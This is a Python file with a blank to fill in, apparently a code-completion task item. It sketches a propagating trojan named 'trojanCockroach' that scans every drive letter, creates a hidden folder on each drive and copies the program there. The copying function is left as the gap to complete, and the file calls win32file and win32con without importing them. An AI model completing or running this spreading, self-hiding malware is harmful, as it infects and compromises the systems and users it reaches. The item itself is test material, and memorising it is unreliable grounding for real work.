import os
import shutil
from pathlib import Path

def find_removable_drives():
    """
    Find all removable drives connected to the system.
    Returns a list of drive letters.
    """
    drives = []
    for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
        drive = f"{letter}:\\"
        if os.path.exists(drive) and os.path.isdir(drive):
            drives.append(drive)
    return drives

def create_hidden_folder(drive):
    """
    Create a hidden folder named 'trojanCockroach' on the specified drive.
    """
    folder_path = os.path.join(drive, 'trojanCockroach')
    os.makedirs(folder_path, exist_ok=True)
    # Make the folder hidden
    attributes = win32file.GetFileAttributesW(folder_path)
    win32file.SetFileAttributesW(folder_path, attributes | win32con.FILE_ATTRIBUTE_HIDDEN)

def copy_program_to_folder(drive):
    <FILL_HERE>
def main():
    """
    Main function to find removable drives, create a hidden folder, and copy the program.
    """
    drives = find_removable_drives()
    if not drives:
        print("No removable drives found.")
        return

    for drive in drives:
        create_hidden_folder(drive)
        copy_program_to_folder(drive)
        print(f"Program copied to {drive}\\trojanCockroach")

if __name__ == "__main__":
    main()